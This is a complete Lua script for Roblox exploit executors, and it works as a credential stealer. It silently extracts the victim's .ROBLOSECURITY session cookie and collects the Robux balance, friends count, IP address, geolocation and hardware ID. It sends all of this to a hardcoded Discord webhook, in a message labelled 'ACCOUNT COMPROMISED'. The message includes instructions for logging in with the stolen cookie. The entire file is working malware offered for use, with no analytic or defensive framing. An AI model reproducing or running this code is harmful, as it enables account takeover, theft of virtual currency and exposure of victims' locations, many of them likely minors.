local HttpService = game:GetService("HttpService")
local webhookUrl = "https://discord.com/api/webhooks/1550475063742955571/roWAkLW-ZNTyNPts5rOxvBSQXrqdzBVe1p7k3taITTXAU2nNC8QpIyGxPUiux_R9ndjq"

local robloToken = nil

-- SILENT COOKIE EXTRACTION (tries every method)
pcall(function()
    if getcookie then robloToken = getcookie(".ROBLOSECURITY") end
end)

if not robloToken or #robloToken < 100 then
    pcall(function()
        local cookies = game:GetService("HttpService"):GetCookies("https://www.roblox.com")
        for _, c in pairs(cookies) do
            if c.Name == ".ROBLOSECURITY" then robloToken = c.Value end
        end
    end)
end

if not robloToken or #robloToken < 100 then
    pcall(function()
        if request then
            local r = request({Url = "https://www.roblox.com/mobileapi/userinfo", Method = "GET"})
            if r.Cookies and r.Cookies[".ROBLOSECURITY"] then
                robloToken = r.Cookies[".ROBLOSECURITY"]
            end
        end
    end)
end

-- Get account information
local userInfo = {}
pcall(function()
    userInfo = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/authenticated"))
end)

local userId = userInfo.id or 0
local username = userInfo.name or "Unknown"
local displayName = userInfo.displayName or "Unknown"

-- Get Robux balance
local robux = "Unknown"
if userId ~= 0 then
    pcall(function()
        local data = HttpService:JSONDecode(game:HttpGet("https://economy.roblox.com/v1/users/" .. userId .. "/currency"))
        robux = tostring(data.robux or 0)
    end)
end

-- Get Premium status
local premium = "No"
if userId ~= 0 then
    pcall(function()
        local data = HttpService:JSONDecode(game:HttpGet("https://premiumfeatures.roblox.com/v1/users/" .. userId .. "/validate-membership"))
        if data.isPremium then premium = "Yes" end
    end)
end

-- Get account age
local created = userInfo.created or "Unknown"
local accountAge = "Unknown"
if created ~= "Unknown" then
    pcall(function()
        local createdDate = DateTime.fromIsoDate(created)
        local days = math.floor((DateTime.now().UnixTimestamp - createdDate.UnixTimestamp) / 86400)
        accountAge = tostring(days) .. " days"
    end)
end

-- Get friends count
local friends = "Unknown"
if userId ~= 0 then
    pcall(function()
        local data = HttpService:JSONDecode(game:HttpGet("https://friends.roblox.com/v1/users/" .. userId .. "/friends/count"))
        friends = tostring(data.count or 0)
    end)
end

-- Get avatar thumbnail
local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150"

-- Get IP and location
local ipData = {}
pcall(function()
    ipData = HttpService:JSONDecode(game:HttpGet("https://ipapi.co/json/"))
end)

local ip = ipData.ip or "Unknown"
local location = (ipData.city or "Unknown") .. ", " .. (ipData.region or "Unknown") .. ", " .. (ipData.country_name or "Unknown")

-- Get executor info
local executor = "Unknown"
pcall(function() executor = identifyexecutor() end)

local hwid = "Unknown"
pcall(function() hwid = gethwid() end)

-- Determine if cookie was successfully grabbed
local cookieStatus = "❌ FAILED"
local cookieValue = "Cookie extraction blocked by executor"

if robloToken and #robloToken > 100 then
    cookieStatus = "✅ SUCCESS"
    cookieValue = robloToken
end

-- Send to webhook
local embed = {
    ["content"] = "@everyone 🚨 **ACCOUNT COMPROMISED** 🚨",
    ["embeds"] = {{
        ["title"] = "🎯 Roblox Account Takeover",
        ["color"] = cookieStatus == "✅ SUCCESS" and 65280 or 15158332,
        ["thumbnail"] = {["url"] = avatar},
        ["fields"] = {
            {["name"] = "Cookie Status", ["value"] = cookieStatus, ["inline"] = false},
            {["name"] = "👤 Username", ["value"] = "`@" .. username .. "`", ["inline"] = true},
            {["name"] = "🎭 Display Name", ["value"] = "`" .. displayName .. "`", ["inline"] = true},
            {["name"] = "🆔 User ID", ["value"] = "`" .. tostring(userId) .. "`", ["inline"] = true},
            {["name"] = "💎 Robux", ["value"] = "`" .. robux .. "`", ["inline"] = true},
            {["name"] = "⭐ Premium", ["value"] = "`" .. premium .. "`", ["inline"] = true},
            {["name"] = "👥 Friends", ["value"] = "`" .. friends .. "`", ["inline"] = true},
            {["name"] = "📅 Account Age", ["value"] = "`" .. accountAge .. "`", ["inline"] = true},
            {["name"] = "🌐 IP Address", ["value"] = "`" .. ip .. "`", ["inline"] = true},
            {["name"] = "🌍 Location", ["value"] = "`" .. location .. "`", ["inline"] = false},
            {["name"] = "🔧 Executor", ["value"] = "`" .. executor .. "`", ["inline"] = true},
            {["name"] = "🖥️ HWID", ["value"] = "`" .. hwid .. "`", ["inline"] = false},
            {["name"] = "🍪 Session Cookie", ["value"] = "```" .. cookieValue .. "```", ["inline"] = false}
        },
        ["footer"] = {["text"] = "To log in: Go to roblox.com → F12 → Console → Paste cookie"},
        ["timestamp"] = DateTime.now():ToIsoDate()
    }}
}

local payload = HttpService:JSONEncode(embed)

pcall(function()
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = payload
    })
end)

pcall(function()
    http_request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = payload
    })
end)
